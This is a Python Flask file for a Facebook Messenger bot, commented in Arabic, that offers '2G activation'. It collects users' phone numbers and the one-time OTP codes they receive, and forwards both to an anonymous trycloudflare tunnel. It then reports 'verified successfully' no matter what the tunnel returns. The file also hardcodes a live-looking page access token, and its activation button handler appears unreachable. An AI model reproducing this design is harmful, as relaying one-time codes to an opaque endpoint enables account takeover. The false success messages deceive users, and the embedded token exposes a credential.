from flask import Flask, request, jsonify
import requests
import os

app = Flask(__name__)

# 🔑 الإعدادات
PAGE_TOKEN = "EAAMD5SUZAe8YBRXJJUDEJLkodssihglZAqBFjCM04U46WpMbdjnaJP2UYnuI3xZCR09ZBdWzn0tmXOU526qk5wp9nQ4WFwbKqMY2tqjcpjv6PeDYLdvgmdA9zr3UYChHUk5ZBaIz8ZAhlvXOYP64eLFmUnROA8eIYWYMXIbMDooNE3jQFmP3hAChHimVg6ZBU8P9yo0JQZDZD"
VERIFY_TOKEN = "zako70012"

PHONE_API = "https://relation-cap-prince-exhibitions.trycloudflare.com/run"

# 🧠 تخزين حالة المستخدم
users = {}


# =========================
# 📩 إرسال رسالة
# =========================
def send_message(psid, text, buttons=None):
    url = "https://graph.facebook.com/v19.0/me/messages"
    params = {"access_token": PAGE_TOKEN}

    if buttons:
        payload = {
            "recipient": {"id": psid},
            "message": {
                "attachment": {
                    "type": "template",
                    "payload": {
                        "template_type": "button",
                        "text": text,
                        "buttons": buttons
                    }
                }
            }
        }
    else:
        payload = {
            "recipient": {"id": psid},
            "message": {"text": text}
        }

    requests.post(url, json=payload, params=params)


# =========================
# 🌐 الصفحة الرئيسية
# =========================
@app.route("/")
def home():
    return jsonify({
        "status": "running",
        "message": "API + Facebook Bot 🚀"
    })


# =========================
# 🔐 تحقق فيسبوك
# =========================
@app.route("/webhook", methods=["GET"])
def verify():
    if (request.args.get("hub.mode") == "subscribe" and
        request.args.get("hub.verify_token") == VERIFY_TOKEN):
        return request.args.get("hub.challenge"), 200
    return "error", 403


# =========================
# 📩 استقبال الرسائل
# =========================
@app.route("/webhook", methods=["POST"])
def webhook():
    data = request.get_json()

    try:
        entry = data["entry"][0]
        messaging = entry["messaging"][0]

        psid = messaging["sender"]["id"]

        # ❌ تجاهل الأحداث غير الرسائل
        if "message" not in messaging:
            return "ok", 200

        message = messaging["message"]

        # ❌ منع loop (echo)
        if message.get("is_echo"):
            return "ok", 200

        text = message.get("text", "").strip()

        # =========================
        # 👋 أول مرة
        # =========================
        if psid not in users:
            users[psid] = {"step": "start"}

            send_message(psid,
                "👋 مرحبا بك في بوت تفعيل 2G\n"
                "⚠️ البوت لا يزال قيد التطوير\n"
                "📢 لا تنسَ متابعة الصفحة ليصلك الجديد 🆕\n\n"
                "📱 أرسل رقم هاتفك للبدء:"
            )
            users[psid]["step"] = "phone"
            return "ok", 200

        user = users[psid]

        # =========================
        # 📱 إدخال رقم الهاتف
        # =========================
        if user["step"] == "phone":
            user["phone"] = text
            user["step"] = "otp"

            try:
                requests.post(PHONE_API, json={
                    "action": "send_otp",
                    "phone": text
                })
            except:
                pass

            send_message(psid, "📩 تم إرسال رمز OTP، أدخله الآن")
            return "ok", 200

        # =========================
        # 🔐 إدخال OTP
        # =========================
        if user["step"] == "otp":
            user["otp"] = text
            user["step"] = "done"

            try:
                requests.post(PHONE_API, json={
                    "action": "activate",
                    "phone": user["phone"],
                    "otp": text
                })
            except:
                pass

            buttons = [
                {
                    "type": "postback",
                    "title": "تفعيل 2G",
                    "payload": "ACTIVATE_2G"
                }
            ]

            send_message(psid, "🎉 تم التحقق بنجاح", buttons)
            return "ok", 200

        # =========================
        # 🔘 زر التفعيل
        # =========================
        if "postback" in messaging:
            payload = messaging["postback"]["payload"]

            if payload == "ACTIVATE_2G":
                send_message(psid, "⏳ يتم الآن تفعيل عرض 2G...")
                return "ok", 200

    except Exception as e:
        print("ERROR:", e)

    return "ok", 200


# =========================
# 🚀 تشغيل السيرفر
# =========================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)